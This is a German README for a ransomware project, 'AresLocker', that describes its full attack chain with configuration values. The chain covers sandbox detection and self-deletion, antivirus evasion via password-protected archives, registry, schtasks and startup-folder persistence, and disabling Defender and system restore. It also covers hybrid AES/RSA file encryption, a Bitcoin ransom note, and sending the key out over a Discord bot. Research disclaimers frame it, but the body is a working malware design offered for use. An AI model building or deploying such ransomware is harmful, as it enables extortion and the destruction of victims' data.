# ARES-LOCKER RANSOMEWARE

# Disclaimer:
Dieses Projekt dient ausschließlich zu Forschungs-, Analyse- und Testzwecken im Bereich IT-Sicherheit. Die Nutzung, Verbreitung oder Anwendung auf fremden Systemen ohne ausdrückliche, schriftliche Genehmigung ist strengstens untersagt und kann strafrechtliche Konsequenzen nach sich ziehen. Der Autor übernimmt keinerlei Haftung für Schäden, die durch unsachgemäßen oder missbräuchlichen Einsatz entstehen. Verwenden Sie dieses Projekt niemals auf produktiven Systemen oder außerhalb kontrollierter, legaler Testumgebungen.


# AresLocker – Technische Übersicht und Ablauf

## 1. Start
Das Programm wird mit `run.py` gestartet. Dieses Skript initialisiert den Ablauf und prüft die Umgebung. Es lädt die notwendigen Module und stellt sicher, dass alle Abhängigkeiten vorhanden sind. Zudem wird geprüft, ob das Programm mit Administratorrechten läuft, da für einige Aktionen (z. B. Registry-Änderungen, Systemdienste) erhöhte Rechte benötigt werden. Das Skript kann Logdateien anlegen, um den Ablauf zu protokollieren, und prüft, ob bereits eine Instanz läuft (z. B. über Mutex oder Lock-Datei).

## 2. Analysephase
Zu Beginn prüft das Programm, ob es in einer Analyseumgebung läuft (z. B. VM, Sandbox, Debugger):
- **Analyse erkannt:**
  - `encryptor/7z.exe` und `encryptor/dell.bat` werden genutzt, um das Programm und seine Spuren zu entfernen. Dabei werden temporäre Dateien, Logs und eventuell bereits extrahierte Komponenten gelöscht.
  - Die Erkennung erfolgt durch das Auslesen typischer VM- oder Sandbox-Merkmale (z. B. Prozessnamen, MAC-Adressen, laufende Debugger, spezielle Registry-Keys, virtuelle Hardware, ungewöhnliche Systemkonfigurationen, bekannte Analyse-Tools).
  - Optional kann das Programm versuchen, Netzwerkverbindungen zu Analyse-Servern zu erkennen und darauf zu reagieren.
- **Keine Analyse erkannt:**
  - `encryptor/extract.bat` extrahiert die weiteren Komponenten mit 7zip und startet die Persistenzphase. Die Batch-Datei sorgt dafür, dass alle benötigten Skripte und Tools in die vorgesehenen Verzeichnisse entpackt werden. Dies umgeht Antivierensoftware
  kommplet da diese keine verschlüsselten und passwortgesicherten
  Arcive scannen können.

## 3. Persistenz
- `encryptor/arciv/run.bat` sorgt dafür, dass das Programm nach jedem Neustart des Systems automatisch wieder ausgeführt wird (z. B. durch Eintrag in die Autostart-Registry oder geplante Tasks).
- Es werden verschiedene Methoden zur Persistenz genutzt, u. a.:
  - Eintrag in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` für den aktuellen Benutzer
  - Erstellung eines geplanten Tasks mit `schtasks` (z. B. täglicher Start, Trigger bei Anmeldung)
  - Kopieren der Batch-Datei in das Autostart-Verzeichnis (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`)
  - Optional: Manipulation von Systemdiensten oder Scheduled Tasks für erhöhte Privilegien
- Die Persistenzmechanismen werden regelmäßig überprüft und ggf. wiederhergestellt, falls sie entfernt wurden (Selbstheilung).

## 4. Terminüberwachung
- `encryptor/arciv/trigger.bat` überwacht, ob ein vordefinierter Zeitpunkt erreicht ist (z. B. über eine Endlosschleife mit Zeitabfrage).
- Die Zeitsteuerung kann auf verschiedene Arten erfolgen:
  - Überprüfung des aktuellen Datums/Uhrzeit gegen einen in der Konfiguration festgelegten Wert
  - Optional: Abgleich mit einem externen Zeitserver oder über das Internet (z. B. NTP, HTTP-Request)
  - Möglichkeit, die Ausführung zu verzögern, um Erkennung zu erschweren
- **Zeitpunkt erreicht:**
  - `encryptor/arciv/main.py` startet die Hauptfunktion. Hier werden die eigentlichen Schadfunktionen ausgeführt, z. B. Dateiverschlüsselung, Anzeige der Lösegeldforderung.
  - Parallel dazu deaktiviert `encryptor/arciv/disalbe.py` Schutzmechanismen (z. B. Windows Defender, Task-Manager, Systemwiederherstellung). Dies geschieht durch Registry-Änderungen, das Stoppen von Diensten, das Löschen von Systemdateien und das Blockieren von Prozessen.
  - Optional: Manipulation der Hosts-Datei, um Sicherheitsupdates oder Hilfeseiten zu blockieren.

## 5. Hauptfunktion
- `encryptor/arciv/encryptor.py` durchsucht das System nach Dateien und verschlüsselt diese mit einem RSA-Schlüsselpaar aus `keys/`.
- Es werden gezielt bestimmte Dateitypen (z. B. Dokumente, Bilder, Archive, Datenbanken, Quellcode) in allen erreichbaren Laufwerken und Benutzerverzeichnissen gesucht. Systemverzeichnisse können ausgeschlossen werden, um die Funktionsfähigkeit des Systems zu erhalten.
- Bei der Verschlüsselung wird ein zufälliger universeller AES Schlüssel generiert und mit dem öffentlichen RSA-Schlüssel verschlüsselt wird (Hybridverschlüsselung, z. B. AES + RSA). Dies spart Zeit, Rechenleistung und ist einfacher anzupassen.
- Die verschlüsselten Dateien erhalten eine neue Endung (z. B. `.ares`).
- `encryptor/arciv/note.py` erstellt und zeigt eine Lösegeldforderung als Textdatei auf dem Desktop und in den betroffenen Verzeichnissen an. Die Nachricht enthält Kontaktinformationen, Zahlungsanweisungen (z. B. Bitcoin-Adresse), eine individuelle ID und ggf. Hinweise zur Kontaktaufnahme.
- **Der generierte AES-Schlüssel wird nach der Verschlüsselung automatisch mit `dc_extract.py` über einen Discord-Bot an einen definierten Kanal verschickt. So wird der Schlüssel sicher extern hinterlegt.**
- Optional: Netzwerkfreigaben und angeschlossene Laufwerke werden ebenfalls verschlüsselt.
- Optional: Das Programm kann versuchen, nach bestimmten Prozessen (z. B. Datenbankserver) zu suchen und diese vor der Verschlüsselung zu beenden.


**Datei- und Verzeichnisstruktur:**
- Alle Skripte und Batch-Dateien befinden sich im Verzeichnis `encryptor/arciv/` bzw. im Hauptverzeichnis `encryptor/`.
- Die Schlüssel zur Ver- und Entschlüsselung liegen im Ordner `keys/` (`private.pem`, `public.pem`).
- `decryptor/` enthält Tools zur Entschlüsselung, sofern der private Schlüssel bekannt ist.
- Wichtige Dateien und deren Aufgaben:
  - `run.py`: Startpunkt, Initialisierung, Rechteprüfung, Logging
  - `extract.bat`: Entpacken der Komponenten, AV-Umgehung
  - `run.bat`: Persistenzmechanismus, Autostart
  - `trigger.bat`: Zeitüberwachung, Verzögerung
  - `main.py`: Steuerung der Hauptfunktion, Koordination
  - `encryptor.py`: Verschlüsselung der Dateien, Dateisuche
  - `note.py`: Anzeige und Erstellung der Lösegeldforderung
  - `disalbe.py`: Deaktivierung von Schutzmechanismen, Registry- und Dienstemanipulation
  - `dell.bat`: Selbstlöschung bei Analyseerkennung
  - `7z.exe`: Entpacken von Archiven
  - `dc_extract.py`: Verschicken des universellen AES-Schlüssels über Discord 
- Die Verzeichnisse sind so strukturiert, dass eine Trennung zwischen Verschlüsselung, Entschlüsselung und Schlüsseln besteht.

**Ablaufdiagramm (vereinfacht):**
1. Start (`run.py`): Initialisierung, Rechteprüfung, Logging
2. Analysephase → ggf. Selbstlöschung (`dell.bat`)
3. Extraktion & Persistenz (`extract.bat`, `run.bat`)
4. Terminüberwachung (`trigger.bat`)
5. Hauptfunktion: Verschlüsselung & Anzeige der Lösegeldforderung (`main.py`, `encryptor.py`, `note.py`)
   - Schutzmechanismen deaktivieren (`disalbe.py`)
   - Systemwiederherstellung verhindern
   - Netzwerkfreigaben und externe Laufwerke optional einbeziehen

**Konfigurationen:**
    # === Werte für die Lösegeldforderung ===
    BTC_ADDRESS = "1A2b3C4d5E6f7G8h9I0jKLMNOPqrStUv"  # Bitcoin-Adresse
    CONTACT_EMAIL = "unlock@fakedomain.to"            # Kontakt-E-Mail
    COUNTDOWN_HOURS = 72                               # Countdown in Stunden
    TIMER_FILE = "ransom_timer.txt"                   # Timer-Dateiname

    # === Werte für den Upload des Keys auf Discord ===
    TOKEN = "DEIN_DISCORD_BOT_TOKEN"  # Hier deinen Bot Token eintragen
    CHANNEL_ID = 123456789012345678  # Hier die Ziel-Channel-ID eintragen
    FILEPATH = "key.txt" # Universeller AES-Key

    # === Werte für die Verschlüsselung ===
    CHUNK_SIZE = 1024  # 1 KB pro Chunk
    CHUNK_SIZE = 5 * 1024 * 1024  # Größe der Chunks beim Lesen großer Dateien (5 MB)
    RSA_PUBLIC_KEY_PATH = Path("public.pem")  # Pfad zum öffentlichen RSA-Schlüssel
    ENCRYPTED_KEY_FILENAME = "key.txt"        # Name der Datei für den verschlüsselten AES-Schlüssel
    LOG_FILE = Path("encryption.log")         # Logdatei für den Verschlüsselungsprozess
    ENCRYPTED_EXTENSION = ".areslock"         # Dateiendung für verschlüsselte Dateien

    # === Verzeichnisse, die bei der Dateisuche ignoriert werden ===
    EXCLUDED_DIRS = [
        Path('C:\\Windows'),                  # Windows-Systemverzeichnis
        Path('C:\\Program Files'),            # Programme
        Path('C:\\Program Files (x86)'),      # 32-Bit-Programme
        Path('C:\\System Volume Information'),# Systeminformationen
        Path('C:\\$Recycle.Bin'),             # Papierkorb
        Path('C:\\Users\\Default'),           # Default-User
        Path('C:\\Users\\Public'),            # Öffentliche Benutzer
        Path('C:\\ProgramData'),              # Programmdaten
        Path('C:\\Recovery')                  # Recovery-Partition
    ]

    # === Werte für das Hauotprogramm ===
    BITCOIN_URL = "https://www.bitcoin.com"  # Zahlungs-URL
    NOTE_PROCESS_NAME = "note.exe"           # Name der Lösegeldforderung
    NOTE_EXE_PATH = r"note.exe"              # Pfad zur Lösegeldforderung

**Sicherheitshinweis:**
Dieses Programm dient ausschließlich zu Forschungs- und Testzwecken. Der Missbrauch kann strafbar sein! Verwenden Sie es niemals auf produktiven Systemen oder ohne ausdrückliche Genehmigung.
